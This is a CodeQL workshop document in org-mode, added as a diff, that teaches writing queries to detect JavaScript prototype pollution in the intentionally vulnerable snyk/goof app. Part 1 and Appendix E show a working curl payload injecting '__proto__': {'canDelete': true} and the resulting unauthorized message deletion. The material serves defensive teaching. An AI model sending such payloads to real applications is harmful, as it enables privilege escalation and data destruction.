@@ -1,0 +1,620 @@
+# -*- coding: utf-8 -*-
+# Created 2020-10-19 Mon 14:11
+#+TITLE: CodeQL workshop for javascript
+#+AUTHOR: Michael Hohn
+#+LANGUAGE:  en
+#+TEXT:      
+#+OPTIONS: ^:{} H:2 num:t \n:nil @:t ::t |:t ^:nil f:t *:t TeX:t LaTeX:t skip:nil p:nil
+#+OPTIONS: toc:nil
+#+HTML_HEAD: <link rel="stylesheet" type="text/css" href="./l3style.css"/>
+#+HTML: <div id="toc">
+#+TOC: headlines 2        insert TOC here, with two headline levels
+#+HTML: </div> 
+# 
+#+HTML: <div id="org-content">
+
+* Setup instructions for Visual Studio Code
+  To run CodeQL queries offline, follow these steps:
+
+  1. Install the Visual Studio Code IDE.
+  2. Download and install the [[https://help.semmle.com/codeql/codeql-for-vscode.html][CodeQL extension for Visual Studio Code]]. Full setup
+     instructions are [[https://help.semmle.com/codeql/codeql-for-vscode/procedures/setting-up.html][here]].
+  3. [[https://help.semmle.com/codeql/codeql-for-vscode/procedures/setting-up.html#using-the-starter-workspace][Set up the starter workspace]].
+     - *Important*: Don't forget to =git clone --recursive= or =git submodule
+       update --init --remote=, so that you obtain the standard query libraries.
+  4. Open the starter workspace: File > Open Workspace > Browse to
+     =vscode-codeql-starter/vscode-codeql-starter.code-workspace=.
+
+* Download the workshop zip file
+  The [[https://drive.google.com/file/d/1eTHIFXO4AThVmI1eHdS2oi6caeDEkilD/view?usp=sharing][codeql-js-goof-workshop.zip]] file contains these instructions, the codeql
+  database, and a directory with the codeql samples we will develop during the
+  workshop.  You can use the codeql samples directory as-is by adding it to your
+  workspace.
+
+* Setting up your environment
+  In case of ql library version errors when trying to run a query, try to set your
+  environment to match the one for this workshop by setting the ql library version
+  to v1.25.0:
+
+  - For a standalone ql tree, something like this
+    #+BEGIN_SRC sh
+    cd ~/local/vmsync/ql
+    git checkout -b mh-v1.25.0 v1.25.0
+    #+END_SRC
+
+  - For ql in the starter workspace:
+    #+BEGIN_SRC sh
+      cd ~/local/vscode-codeql-starter
+      git pull
+      git submodule update            # avoid database scheme mismatch
+      git checkout -b mh-v1.25.0 origin/1.25.0
+    #+END_SRC
+
+* CodeQL workshop for javascript, Part 1: Identify the Problem
+  Before any queries can be written, we 
+  1. should be certain that the application has a vulnerability and
+  2. we have to identify the parts of the application's source code affected by
+     it.
+  
+
+** The Prototype Pollution Problem
+   In this workshop, we focus on Javascript Prototype Pollution.
+
+   Prototype pollution is a type of vulnerability in which an attacker is able to
+   modify =Object.prototype=.  This can happen when recursively merging a
+   user-controlled object into another object, allowing an attacker to
+   modify the built-in Object prototype.  Once that is done, later requests can
+   abuse the new property, e.g. to gain access to parts of a system.
+
+   This is best illustrated via example; the all-in-one vulnerable app, [[https://github.com/snyk/goof][goof]],
+   provides a good sample for prototype injection in a web app.  It labels itself
+   as the /Super vulnerable todo list application/, and has samples for seeing
+   those vulnerabilities in action.
+
+** Exploit the snyk/goof Application
+   This is a concise run to exploit the prototype injection of [[https://github.com/snyk/goof][snyk/goof]].  For a
+   complete walkthrough, see [[*Appendix E: Complete Setup and Exploit of the snyk/goof Application][Appendix E: Complete Setup and Exploit of the
+   snyk/goof Application]].
+
+   For the workshop we only need to collect vulnerability information; once goof
+   is running, we try the prototype-pollution exploits:
+   #+BEGIN_SRC sh
+     # Check exploits
+     bash
+     . ~/local/goof/exploits/prototype-pollution.sh
+
+     # Try c1 through c4 and exploit:
+     List messages
+             hohn@gh-hohn ~/local/goof/exploits
+             0:$ c1
+             []
+
+     Send some messages
+             hohn@gh-hohn ~/local/goof/exploits
+             0:$ c2
+             {"ok":true}
+             hohn@gh-hohn ~/local/goof/exploits
+             0:$ c2
+             {"ok":true}
+
+     List again
+             hohn@gh-hohn ~/local/goof/exploits
+             0:$ c1
+             [{"icon":"👋","text":"Hi!","id":1,"timestamp":1602276330967,"userName":"user"},
+              {"icon":"👋","text":"Hi!","id":2,"timestamp":1602276331875,"userName":"user"}]
+
+     Try to delete
+             hohn@gh-hohn ~/local/goof/exploits
+             0:$ c4
+             {"ok":false,"error":"Access denied"}
+
+     Use exploit
+             hohn@gh-hohn ~/local/goof/exploits
+             0:$ c3
+             {"ok":true}
+
+     Try to delete again
+             hohn@gh-hohn ~/local/goof/exploits
+             130:$ c4
+             {"ok":true}
+
+     Notice message 1 is gone:
+             hohn@gh-hohn ~/local/goof/exploits
+             0:$ c1
+             [{"icon":"👋","text":"Hi!","id":2,"timestamp":1602276331875,"userName":"user"},
+              {"icon":"👋","text":"😈","id":3,"timestamp":1602276340962,"userName":"user"}]
+   #+END_SRC
+
+
+   Now let's examine the exploits and see what happened.  The requests sent are
+   #+BEGIN_SRC sh
+     // c2, safe
+     {
+         curl --request PUT \
+           --url "$GOOF_HOST/chat" \
+           --header 'content-type: application/json' \
+           --data '{"auth": {"name": "user", "password": "pwd"}, 
+                    "message": {"text": "Hi!"}}'
+     }
+
+     // c3, the exploit:
+     {
+         curl --request PUT \
+           --url "$GOOF_HOST/chat" \
+           --header 'content-type: application/json' \
+           --data '{"auth": {"name": "user", "password": "pwd"}, 
+                    "message": { "text": "😈", "__proto__": {"canDelete": true}}}'
+     }
+
+     // c4, the delete request
+     {
+         curl --request DELETE \
+           --url "$GOOF_HOST/chat" \
+           --header 'content-type: application/json' \
+           --data '{"auth": {"name": "user", "password": "pwd"}, "messageId": 1}'
+     }
+   #+END_SRC
+
+   The first two are PUT requests to the URL =$GOOF_HOST/chat=, but the json messages differ:
+   #+BEGIN_SRC javascript
+        // safe
+        {"auth": {"name": "user", "password": "pwd"}, 
+         "message": {"text": "Hi!"}}
+
+        // exploit
+        {"auth": {"name": "user", "password": "pwd"}, 
+         "message": { "text": "😈", "__proto__": {"canDelete": true}}}
+   #+END_SRC
+
+   The =__proto__= change allows the delete request to succeed.
+
+** Find problems in source code
+   Next, we need to see where and why this is causing the problem in the
+   application.  A short inspection of the source code sheds some light on this
+   issue. 
+
+   The app entry point is seen from the startup command:
+   #+BEGIN_SRC sh
+     node app.js                     # from ~/local/goof/package.json
+   #+END_SRC
+
+   For prototype pollution, the c3 send is a http PUT to =$GOOF_HOST/chat=, with an
+   invalid =message=:
+   #+BEGIN_SRC sh
+     curl --request PUT \
+       --url "$GOOF_HOST/chat" \
+       --header 'content-type: application/json' \
+       --data '{"auth": {"name": "user", "password": "pwd"}, 
+                "message": { "text": "😈", "__proto__": {"canDelete": true}}}'
+   #+END_SRC
+
+   Inspect the code to track these;  starting from =app.js=, we see that
+   #+BEGIN_SRC js
+     // requests are passed through to routes.chat.add via 
+     app.put('/chat', routes.chat.add);
+   #+END_SRC
+   and in =index.js= line 259, =routes.chat.add=, we see that
+   #+BEGIN_SRC javascript
+      // requests pass into 
+      exports.chat.add(req, res)
+      // where the the incoming req.body.message directly merged without checks:
+      _.merge(message, req.body.message, {...})
+      // so message (an {}) now has "__proto__": {"canDelete": true}
+   #+END_SRC
+
+   This can be seen using the debugger in VS Code; see [[*Appendix A: Trace the exploit in the VS Code JS Debugger][Appendix A: Trace the
+   exploit in the VS Code JS Debugger]] for details.
+
+   Key information for the later queries:
+   - the request entry through =routes.chat.add()=
+   - the request use in the =_.merge()= call
+
+* CodeQL workshop for javascript, Part 2: Write query
+  With the known vulnerability and the information from above, 
+  - the request data enters through =routes.chat.add()=
+  - the request's data is used in the =_.merge()= call
+  we can now proceed to write queries to find these problems.
+
+** Import the CodeQL database
+   The codeql database for this project is part of the workshop zip file.  You
+   likely got it in the setup step, but here is the link:  [[https://drive.google.com/file/d/1eTHIFXO4AThVmI1eHdS2oi6caeDEkilD/view?usp=sharing][codeql-js-goof-workshop.zip]].
+
+   Next, import the database directory into your VS Code workspace; the name is
+   =js-goof-9300e9a=.
+
+   For completeness and reference, here are the steps used to build the codeql
+   database; this requires the codeql cli tools:
+
+   #+BEGIN_SRC sh
+       #* build db
+       SRCDIR=$HOME/local/goof
+       DB=$HOME/local/db/js-goof-$(cd $SRCDIR && git rev-parse --short HEAD)
+       echo $DB
+       test -d "$DB" && rm -fR "$DB"
+       mkdir -p "$DB"
+
+       export PATH=$HOME/local/vmsync/codeql224:"$PATH"
+       codeql database create --language=javascript -s $SRCDIR  -j 8 -v $DB
+
+       # Successfully created database at ~/local/db/js-goof-9300e9a
+   #+END_SRC
+
+** Custom query for local flow
+   Based on what we found in [[*Find problems in source code][Find problems in source code]], the sink should be
+   any argument to =merge()= past the first, so let's use that.
+
+   The files [[./flow-query-0.ql]] etc. build a local flow query from scratch for the
+   Javascript Prototype Pollution problem.  We cover these in detail in the
+   workshop, but here is the outline of what each introduces for later reference:
+
+   - [[./flow-query-0.ql]]  identify sink: from, where, select, MethodCallExpr
+   - [[./flow-query-1.ql]]  getAnArgument
+   - [[./flow-query-2.ql]]  Introduce =predicate= and convert to =predicate mergeCallArg= 
+   - [[./flow-query-3.ql]]  identify source: FunctionExpr, getName
+   - [[./flow-query-4.ql]]  parameter and body: getNumParameter, getBody
+   - [[./flow-query-5.ql]]  source argument: getParameter
+   - [[./flow-query-6.ql]]  convert to =predicate chatHandler=
+   - [[./flow-query-7.ql]]  Local flow attempt: getASuccessor, =operator +=,
+     =DataFlowNode=, getAstNode
+   - [[./flow-query-8.ql]]  Flow debugging: flow from source to any
+   - [[./flow-query-9.ql]]  Flow debugging: sink only (sanity check)
+   - [[./flow-query-10.ql]]  Flow debugging: any to sink
+   - [[./flow-query-11.ql]]  Flow try: any to any child of sink: introduce =exists=,
+     getAChild, =operator *=
+   - [[./flow-query-12.ql]]  Local flow: Re-introduce the source restriction,
+     simplify =exists=, get working flow query.
+   - [[./flow-query-13.ql]] Add =predicate mergeCallArg= and =predicate chatHandler=
+     taking =DataFlowNode= to clean up and for re-use in global flow query.
+
+** Custom Global TaintTracking Query and Path Query
+   The [[*Custom query for local flow][Custom query for local flow]] developed the predicates we need for a global
+   taint tracking query.  The files [[./GoofPrototypePollution-0.ql]] etc. develop
+   this query and list pairs of results (sources and sinks).  The sequence:
+   - [[./GoofPrototypePollution-0.ql]]  Raw global taint tracking configuration
+        template.  Introduces =class=, characteristic predicate,
+        =TaintTrackingConfiguration= and =hasFlow()=.
+   - [[./GoofPrototypePollution-1.ql]]  Plug in the previously developed predicates
+        =mergeCallArg= and =chatHandler=, see the flow pairs.
+   - [[./GoofPrototypePollution-2.ql]]  Changes to get a path query.  In addition to
+        the result pairs listed by [[./GoofPrototypePollution-1.ql]], this /path query/
+        also shows some data flow paths between the sources and sinks.  For this
+        example, they are all local.
+
+** CodeQL JS library documentation 
+   The following is an overview of available library documentation; the *bold*
+   items are those used in this workshop.  
+   - [[https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#codeql-library-for-javascript][codeql-library-for-javascript]]
+     - [[https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#syntactic-level][Syntactic Level]]
+       - ASTNode,
+         - TopLevel
+         - Stmt
+         - *Expr*
+           - *FunctionExpr*
+           - InvokeExpr
+             - CallExpr
+             - NewExpr
+             - *MethodCallExpr*
+           - PropAccess
+
+       - [[https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#functions][functions overview ]] and the [[https://help.semmle.com/qldoc/javascript/semmle/javascript/Functions.qll/type.Functions$Function.html][Function]] reference
+         - FunctionDeclStmt (a subclass of Stmt)
+         - *FunctionExpr* (a subclass of Expr)
+         - ArrowFunctionExpr (also a subclass of Expr)
+       - ClassDefinition,
+         - ClassDeclStmt (which is a subclass of Stmt)
+         - ClassExpr (which is a subclass of Expr)
+       - MemberDefinition
+         - MethodDefinition
+         - FieldDefinition
+       - DeclStmt
+       - BindingPattern
+         - VarRef
+         - Parameter
+         - ArrayPattern
+         - ObjectPattern
+       - Property: Properties in object literals.  Is also a subclass of ASTNode,
+         but neither of Expr nor of Stmt.
+       - Module
+         - ES2015Module
+         - NodeModule
+         - AMDModule
+       - Scope
+         - GlobalScope
+         - FunctionScope
+         - CatchScope
+       - Variable 
+         - VarDecl
+         - VarAccess
+     - [[https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#control-flow][Control Flow Graph]]
+       - ControlFlowNode
+     - [[https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#data-flow][Data Flow]]
+       - definition and use
+         - VarDef
+         - VarUse
+       - ssa
+       - [[https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#data-flow-nodes][data flow nodes]]
+         - *DataFlow::Node*
+           - ValueNode
+             - /To =ValueNode=/: use =DataFlow::valueNode= to convert an
+               expression, function or class into its corresponding ValueNode
+             - /From =ValueNode=/: use =ValueNode.getAstNode()= for mapping from
+               ValueNodes to ASTNodes
+
+           - SsaDefinitionNode
+             - /To =SsaDefinitionNode=/, use =DataFlow::ssaDefinitionNode= to map
+               an SSA definition to its corresponding SsaDefinitionNode.
+             - /To =SsaDefinitionNode= for a parameter:/ the auxiliary predicate
+               =DataFlow::parameterNode= maps a parameter to its
+               corresponding data flow node.
+             - /From =SsaDefinitionNode=:/ use
+               =SsaDefinitionNode.getSsaVariable()= to get the =SsaVariable=
+
+         - Use =DataFlow::Node.getAPredecessor()= to find other data flow nodes
+           from which values may flow into this node, and *=getASuccessor()=* for the
+           other direction.
+
+       - [[https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#type-inference][Type inference]]
+       - [[https://help.semmle.com/QL/learn-ql/javascript/introduce-libraries-js.html#call-graph][Call Graph]]
+       - inter-procedural
+         - DataFlow::Configuration
+         - TaintTracking::Configuration
+
+
+** CodeQL JS data flow library documentation 
+   Following are links and short descriptions of the dataflow concepts this
+   workshop touches on.  Follow the links for a more in-depth description.
+
+   - [[https://help.semmle.com/QL/learn-ql/javascript/dataflow.html#analyzing-data-flow-in-javascript-and-typescript][analyzing-data-flow-in-javascript-and-typescript]]
+     - [[https://help.semmle.com/QL/learn-ql/javascript/dataflow.html#local-data-flow][*local data flow*]] Use the member predicates =getAPredecessor()= and
+       =getASuccessor()= on DataFlow::Node.  To follow one or more steps of local
+       data flow, use the transitive closure operator =+=, and for zero or more
+       steps the reflexive transitive closure operator =*=.
+
+     - [[https://help.semmle.com/QL/learn-ql/javascript/dataflow.html#global-data-flow][*global-data-flow*]] global data flow is less precise than local data
+       flow. That is, the analysis may report spurious flows that cannot in fact
+       happen. Moreover, global data flow analysis typically requires
+       significantly more time and memory than local analysis.
+
+
+* Appendices
+** Appendix A: Trace the exploit in the VS Code JS Debugger
+   To see the prototype injection exploit in action using the JS debugger, try the
+   following steps:
+   - set up shell
+     #+BEGIN_SRC sh
+       . ~/local/goof/exploits/prototype-pollution.sh
+       # Gain permissions with c3
+       # Delete message with c4
+     #+END_SRC
+   - Launch for debugging:
+     #+BEGIN_SRC sh
+       cd ~/local/goof
+       echo $$ && node --inspect=$$ app.js
+     #+END_SRC
+   - In vs code, run 'attach to node process', choose the =node --inspect...=
+     process.
+   - Set breakpoints in files, ~/local/goof/routes/index.js line 272
+   - From the shell, send the delete request.  It will fail to delete: 
+     : c4
+   - Run the gain permission exploit, this will trap at breakpoint:
+     : c3
+   - In vs code debug console, observe the value of
+     : ({}).__proto__.canDelete
+     before and after the
+     : _.merge(message, req.body.message, {...})
+     expression.
+
+   Oddly, there is different behavior in node command line:
+   #+BEGIN_SRC javascript
+     // Different behavior in node command line?
+     cd ~/local/goof
+     node
+     Welcome to Node.js v14.13.1.
+     Type ".help" for more information.
+     var _ = require('lodash');
+     var a = {"name": "a"}
+     var b = {"name": "b"}
+     ({}).__proto__.canDelete        // undefined
+     _.merge(a, { "text": "😈", "__proto__": {"canDelete": true}}, b)
+     a.canDelete                     // true
+     b.canDelete                     // undefined
+     ({}).__proto__.canDelete        // undefined
+   #+END_SRC
+  
+** Appendix B: Run default queries
+   It's always worthwhile to try the default queries. 
+   The CWE-400 [[https://github.com/Semmle/ql/blob/c9e22ab2716b29514435c9691776a73cbb3fe4a5/javascript/ql/test/query-tests/Security/CWE-400/src-vulnerable-lodash/tst.js#L1][tst.js]] has this vulnerability, but it's not found in the test
+   code by the queries
+
+   - [[https://github.com/Semmle/ql/blob/86755215ad19e98b7e9490a7205ca4bd436bf1df/javascript/ql/src/Security/CWE-400/PrototypePollution.ql#L21][Security/CWE-400/PrototypePollution.ql]]
+     Recursively merging a user-controlled object into another object
+     can allow an attacker to modify the built-in Object prototype.
+
+   - [[https://github.com/Semmle/ql/blob/86755215ad19e98b7e9490a7205ca4bd436bf1df/javascript/ql/src/Security/CWE-400/PrototypePollutionUtility.ql#L14][Security/CWE-400/PrototypePollutionUtility.ql]]
+     Recursively assigning properties on objects may cause accidental
+     modification of a built-in prototype object.
+
+   without some additions as done in [[*Appendix C: Expand existing query with new sources and sinks][Appendix C: Expand existing query with new sources and sinks]].
+
+** Appendix C: Expand existing query with new sources and sinks
+   The original query found in [[./PrototypePollution-0.ql]] can be enhanced without
+   changing library code by subclassing as is done in [[./PrototypePollution-1.ql]].
+   # 
+   This finds a good set of results, including the local query's results found
+   earlier.
+
+   The results reported by CodeQL:
+   - Prototype pollution caused by merging a user-controlled value from here using a
+     vulnerable version of lodash.  index.js:272:22
+
+     Path
+     | 1 | req              | index.js:259:7  |
+     | 2 | req              | index.js:272:22 |
+     | 3 | req.body         | index.js:272:22 |
+     | 4 | req.body.message | index.js:272:22 |
+
+   - Prototype pollution caused by merging a user-controlled value from here using a
+     vulnerable version of just-a-test .  index.js:272:22
+
+     Path
+     | 1 | req              | index.js:259:7  |
+     | 2 | req              | index.js:272:22 |
+     | 3 | req.body         | index.js:272:22 |
+     | 4 | req.body.message | index.js:272:22 |
+
+** Appendix D: Further Reading
+   The queries provided by the ql library include the following.  They use 
+   flow labels and some other advanced concepts that we won't cover during this
+   workshop.  They are recommended for separate reading.
+
+   - [[https://github.com/Semmle/ql/blob/86755215ad19e98b7e9490a7205ca4bd436bf1df/javascript/ql/src/Security/CWE-400/PrototypePollution.ql#L21][Security/CWE-400/PrototypePollution.ql]]
+   - [[https://github.com/Semmle/ql/blob/86755215ad19e98b7e9490a7205ca4bd436bf1df/javascript/ql/src/Security/CWE-400/PrototypePollutionUtility.ql#L14][Security/CWE-400/PrototypePollutionUtility.ql]]
+
+** Appendix E: Complete Setup and Exploit of the snyk/goof Application
+   This is a concise setup and run of [[https://github.com/snyk/goof][snyk/goof]].  All steps are included for
+   completeness, but for the workshop we only need to collect the vulnerability
+   information.
+
+   1. Install [[https://docs.mongodb.com/manual/tutorial/install-mongodb-on-os-x/#install-mongodb-community-edition][mongodb]]
+      #+BEGIN_SRC sh
+        # Install
+        brew tap mongodb/brew
+        brew install mongodb-community@4.4
+      #+END_SRC
+      To have launchd start mongodb/brew/mongodb-community now and restart at login:
+      : brew services start mongodb/brew/mongodb-community
+      Or, if you don't want/need a background service you can just run:
+      : mongod --config /usr/local/etc/mongod.conf
+
+      Which is what we do:
+      #+BEGIN_SRC sh
+        # Run
+        mongod --config /usr/local/etc/mongod.conf &
+
+        # check log
+        tail /usr/local/var/log/mongodb/mongo.log
+
+        # Connect and test
+        mongo
+
+        db.inventory.insertOne(
+           { item: "canvas", qty: 100, tags: ["cotton"], size: { h: 28, w: 35.5, uom: "cm" } }
+        )
+
+        db.inventory.find( { item: "canvas" } )
+      #+END_SRC
+
+   2. Install goof
+      #+BEGIN_SRC sh
+        # Clone
+        cd ~/local
+        git clone https://github.com/Snyk/goof
+
+        # Build
+        cd ~/local/goof
+        npm install
+
+        # ...
+        # found 253 vulnerabilities (153 low, 17 moderate, 82 high, 1 critical)
+        #   run `npm audit fix` to fix them, or `npm audit` for details
+        # ...
+      #+END_SRC
+
+   3. Run goof
+      #+BEGIN_SRC sh
+        # Run mongodb
+        mongod --config /usr/local/etc/mongod.conf &
+
+        # Run goof
+        cd ~/local/goof
+        npm start                       # follow logs here
+        # or
+        node app.js                     # from ~/local/goof/package.json
+        open http://localhost:3001
+      #+END_SRC
+
+   4. Try prototype-pollution exploits
+      #+BEGIN_SRC sh
+        # Check exploits
+        bash
+        . ~/local/goof/exploits/prototype-pollution.sh
+
+        # Try c1 through c4 and exploit:
+        List messages
+                hohn@gh-hohn ~/local/goof/exploits
+                0:$ c1
+                []
+
+        Send some messages
+                hohn@gh-hohn ~/local/goof/exploits
+                0:$ c2
+                {"ok":true}
+                hohn@gh-hohn ~/local/goof/exploits
+                0:$ c2
+                {"ok":true}
+
+        List again
+                hohn@gh-hohn ~/local/goof/exploits
+                0:$ c1
+                [{"icon":"👋","text":"Hi!","id":1,"timestamp":1602276330967,"userName":"user"},
+                 {"icon":"👋","text":"Hi!","id":2,"timestamp":1602276331875,"userName":"user"}]
+
+        Try to delete
+                hohn@gh-hohn ~/local/goof/exploits
+                0:$ c4
+                {"ok":false,"error":"Access denied"}
+
+        Use exploit
+                hohn@gh-hohn ~/local/goof/exploits
+                0:$ c3
+                {"ok":true}
+
+        Try to delete again
+                hohn@gh-hohn ~/local/goof/exploits
+                130:$ c4
+                {"ok":true}
+
+        Notice message 1 is gone:
+                hohn@gh-hohn ~/local/goof/exploits
+                0:$ c1
+                [{"icon":"👋","text":"Hi!","id":2,"timestamp":1602276331875,"userName":"user"},
+                 {"icon":"👋","text":"😈","id":3,"timestamp":1602276340962,"userName":"user"}]
+      #+END_SRC
+
+   5. The exploit's origin, or "What happened?"
+
+      The requests sent are
+      #+BEGIN_SRC sh
+        // c2, safe
+        {
+            curl --request PUT \
+              --url "$GOOF_HOST/chat" \
+              --header 'content-type: application/json' \
+              --data '{"auth": {"name": "user", "password": "pwd"}, "message": {"text": "Hi!"}}'
+        }
+        // c3, the exploit:
+        {
+            curl --request PUT \
+              --url "$GOOF_HOST/chat" \
+              --header 'content-type: application/json' \
+              --data '{"auth": {"name": "user", "password": "pwd"}, 
+                       "message": { "text": "😈", "__proto__": {"canDelete": true}}}'
+        }
+      #+END_SRC
+
+      Both are PUT requests to the URL =$GOOF_HOST/chat=, but the json messages differ:
+      #+BEGIN_SRC javascript
+        // safe
+        {"auth": {"name": "user", "password": "pwd"}, 
+         "message": {"text": "Hi!"}}
+
+        // exploit
+        {"auth": {"name": "user", "password": "pwd"}, 
+         "message": { "text": "😈", "__proto__": {"canDelete": true}}}
+      #+END_SRC
+
+
+
+
+#+HTML: </div> 
+
